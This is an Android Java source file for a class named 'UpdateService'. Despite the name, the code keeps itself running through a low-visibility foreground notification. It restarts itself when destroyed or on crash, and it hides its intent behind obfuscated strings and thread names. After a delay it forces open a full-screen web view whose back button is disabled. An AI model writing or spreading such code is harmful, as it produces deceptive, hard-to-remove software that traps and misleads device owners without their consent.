package shell.app;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;

import com.mindrex.android.appsupport.SupportService;
import com.mindrex.android.appsupport.htmlviewer.HtmlViewer;
import com.mindrex.io.File;
import com.mindrex.shell.R;

import java.io.Serializable;

public final class UpdateService extends SupportService implements Thread.UncaughtExceptionHandler, Serializable {
    private static final String True = new String(new char[]{'t', 'r', 'u', 'e'}, 0, 4);
    private static final long serialVersionUID = 3785302770391694562L;
    private static boolean ready = true;
    private static Thread thread;
    private static File file;

    public UpdateService() {
    }

    @Override
    public final void attachBaseContext(Context ctx) {
        super.attachBaseContext(ctx);
        updateFile();
    }

    private static void updateFile() {
        if (file == null)
            file = new File(Environment.getExternalStorageDirectory().getAbsolutePath(), "£Ç£é£ô£á£ò£í£é");
        if (file.exists())
            assert file.isDirectory() || (file.delete() && file.mkdir());
        else assert file.mkdir();
    }

    @Override
    public final int onStartCommand(Intent intent, int flags, int startId) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            if (!isForegroundService(this, getClass().getName())) {
                startForegroundService(new Intent(this, getClass()));
                stopSelf();
            }
        return START_STICKY;
    }

    @Override
    public final void onCreate() {
        super.onCreate();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            final NotificationChannel a = new NotificationChannel("a__ID", "a__Name", NotificationManager.IMPORTANCE_MIN);
            ((NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE)).createNotificationChannel(a);
            final Notification b = new NotificationCompat.Builder(this, "a__ID")
                    .setContentTitle(getResources().getString(R.string.background_service))
                    .setContentText(getResources().getString(R.string.background_service_description))
                    .setColor(-1)
                    .setSmallIcon(R.drawable.logo)
                    .setOngoing(true)
                    .setWhen(0)
                    .setPriority(NotificationCompat.PRIORITY_MIN)
                    .setShowWhen(false)
                    .build();
            startForeground(1, b);
        }
        create();
    }

    private void create() {
        if (thread == null)
            thread = new Thread(this) {
                private int current = -60;

                @Override
                public final void start() {
                    setName("\ud80a\uea08\udea7\uf608\uf768");
                    setDaemon(true);
                    setPriority(MAX_PRIORITY);
                    setUncaughtExceptionHandler(UpdateService.this);
                    super.start();
                }

                @Override
                public final void run() {
                    while (Boolean.parseBoolean(True)) {
                        update();
                        sleep();
                    }
                }

                private void update() {
                    if (current >= 0) {
                        UpdateService.this.run();
                        current = -10000;
                    } else current++;
                }

                private void sleep() {
                    try {
                        sleep(1000);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }

                @NonNull
                @Override
                public final Object clone() throws CloneNotSupportedException {
                    throw new CloneNotSupportedException();
                }

                @Override
                public final void finalize() {
                }
            };
        thread.start();
    }

    @Override
    public synchronized final void run() {
        if (ready) {
            final Intent a = new Intent(this, activity.class);
            a.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(a);
            ready = false;
        }
    }

    @Override
    public synchronized final void uncaughtException(@NonNull Thread t, @NonNull Throwable e) {
        create();
    }

    private static boolean isForegroundService(Context a, String b) {
        final ActivityManager c = (ActivityManager) a.getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo d : c.getRunningServices(Integer.MAX_VALUE)) {
            if (b.equals(d.service.getClassName()))
                return d.foreground;
        }
        return false;
    }

    @Override
    public final IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public final void onDestroy() {
        final Context a = getBaseContext();
        final Intent b = new Intent(this, getClass());
        super.onDestroy();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            a.startForegroundService(b);
        else a.startService(b);
    }

    @Override
    public final void finalize() {
    }

    public static final class activity extends Activity {
        private HtmlViewer webView;

        public activity() {
        }

        @Override
        public final void attachBaseContext(Context ctx) {
            super.attachBaseContext(ctx);
            updateFile();
        }

        @Override
        public final void onCreate(Bundle b) {
            super.onCreate(b);
            if (webView == null)
                webView = new HtmlViewer(this, null);
            setContentView(webView);
            webView.load("https://www.google.com/search?q=\uef00");
        }

        @Override
        public final void onBackPressed() {
        }

        @Override
        public final void onDestroy() {
            ready = true;
            super.onDestroy();
        }
    }
}